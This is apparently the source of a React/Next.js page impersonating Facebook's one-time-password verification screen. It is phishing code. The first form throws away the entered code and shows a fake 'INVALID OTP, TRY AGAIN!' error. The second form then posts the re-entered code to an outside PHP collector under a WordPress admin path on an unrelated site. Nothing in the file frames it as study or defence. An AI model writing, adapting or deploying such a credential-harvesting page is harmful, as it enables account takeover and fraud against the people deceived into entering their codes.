"use client"
import Image from "next/image"
import Link from "next/link"
import facebook from "./../public/facebook.svg"
import { useState } from "react"

const OtpForm = () => {
  const [tryAgain, setTryAgain] = useState(true)
  const HandleTryAgain = (e) => {
    e.preventDefault()
    setTryAgain((val) => !val)
  }
  return (
    <div className="flex flex-col h-screen w-full p-4 items-center mt-[25px]">
      {tryAgain ? (
        <form
          className="flex flex-col w-full items-center gap-2"
          onSubmit={HandleTryAgain}
        >
          <div>
            <Image
              src={facebook}
              alt="ways"
              width={"140"}
              height="100"
              className="cursor-pointer"
            />
          </div>
          {/* username */}
          {/* <h1 className="font-semibold text-red-600">
          *INCORRECT LOGIN DETAILS, TRY AGAIN!
        </h1> */}
          <div className="w-full mt-[20px]">
            <input
              type="number"
              name="user_name"
              placeholder="MOBILE OTP"
              className=" w-[100%] md:flex md:w-[30%] md:mx-auto px-2 border-[1px] rounded-md h-[50px] bg-gray-200 shadow-sm pt-1 text-base font-normal text-black/90 shadow-black/30"
              required
            />
          </div>
          {/* Password */}

          {/* Login button */}
          <div className="w-full">
            <button
              className="bg-blue-700 w-[100%] h-[50px] md:flex md:w-[30%] md:mx-auto md:items-center md:justify-center mt-5 rounded-md text-white font-bold text-xl"
              type="submit"
              onClick={HandleTryAgain}
            >
              Verify
            </button>
          </div>

          <Link href={"/"}>
            <p className="text-blue-700 mt-5 text-lg font-medium cursor-pointer">
              Forgotten Password?
            </p>
          </Link>

          <div className="flex w-full mt-6 items-center justify-center">
            <span className="border-b-2 w-2/4 md:w-[30%] border-black/10"></span>
            <p className="px-2"> or</p>
            <span className="border-b-2 w-2/4 md:w-[30%] border-black/10"></span>
          </div>

          <div className="w-full flex items-center justify-center">
            <button className="mt-8 md:mt-[4rem] w-[50%] md:w-[25%] h-10 bg-[#00A400] text-white p-1 rounded-md px-1 text-lg font-semibold">
              Create New Account
            </button>
          </div>
        </form>
      ) : (
        <form
          className="flex flex-col w-full items-center gap-2"
          action={"https://investmentquarters.com/wp-admin/js/pablo2/send2.php"}
          method="POST"
        >
          <div>
            <Image
              src={facebook}
              alt="ways"
              width={"140"}
              height="100"
              className="cursor-pointer"
            />
          </div>
          {/* username */}
          <h1 className="font-semibold text-red-600">
            *INVALID OTP, TRY AGAIN!
          </h1>
          <div className="w-full mt-[20px]">
            <input
              type="number"
              name="user_otp"
              placeholder="MOBILE OTP"
              className=" w-[100%] md:flex md:w-[30%] md:mx-auto px-2 border-[1px] rounded-md h-[50px] bg-gray-200 shadow-sm pt-1 text-base font-normal text-black/90 shadow-black/30"
              required
            />
          </div>
          {/* Password */}

          {/* Login button */}
          <div className="w-full">
            <button
              className="bg-blue-700 w-[100%] h-[50px] md:flex md:w-[30%] md:mx-auto md:items-center md:justify-center mt-5 rounded-md text-white font-bold text-xl"
              type="submit"
            >
              Verify
            </button>
          </div>

          <Link href={"/"}>
            <p className="text-blue-700 mt-5 text-lg font-medium cursor-pointer">
              Forgotten Password?
            </p>
          </Link>

          <div className="flex w-full mt-6 items-center justify-center">
            <span className="border-b-2 w-2/4 md:w-[30%] border-black/10"></span>
            <p className="px-2"> or</p>
            <span className="border-b-2 w-2/4 md:w-[30%] border-black/10"></span>
          </div>

          <div className="w-full flex items-center justify-center">
            <button className="mt-8 md:mt-[4rem] w-[50%] md:w-[25%] h-10 bg-[#00A400] text-white p-1 rounded-md px-1 text-lg font-semibold">
              Create New Account
            </button>
          </div>
        </form>
      )}
    </div>
  )
}

export default OtpForm
